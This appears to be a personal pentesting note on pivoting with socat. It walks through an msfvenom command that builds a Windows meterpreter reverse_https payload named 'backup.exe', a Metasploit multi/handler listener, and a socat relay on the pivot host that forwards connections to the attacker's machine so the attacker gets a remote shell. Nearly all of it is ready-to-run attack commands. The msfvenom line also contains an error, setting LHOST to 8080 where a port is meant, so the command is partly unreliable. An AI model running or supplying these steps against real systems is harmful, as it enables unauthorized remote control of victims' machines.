-- -
A bidirectional relay tool. Creates a pipe socket between 2 independent network channels w/o needing to use ssh tunneling. You need to run the relay from the pivot host, so you **might** need to download socat, [[Dark Arts/File Transfer/~Home|file transfer]] it to the pivot host and run it there. 
### Payload
Create a payload for the target box, in this example a windows box on the internal network.
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<pivot ip> LHOST=8080 -f exe -o backup.exe
```
[[Dark Arts/File Transfer/~Home|File transfer]] over the payload to the pivot box, then to the target box. 
### Start listeners
Start multi handler on attack box:
```bash
# may or may not need sudo
sudo msfconsole
use multi/handler
set lhost 0.0.0.0
set lport 80
set payload windows/x64/meterpreter/reverse_https
run
```
setup relay on pivot host:
```bash
socat TCP4-LISTEN:8080,fork TCP4:<attack ip>:80
```
Then run the payload on the target host and you should see your multi handler caught a meterpreter shell. 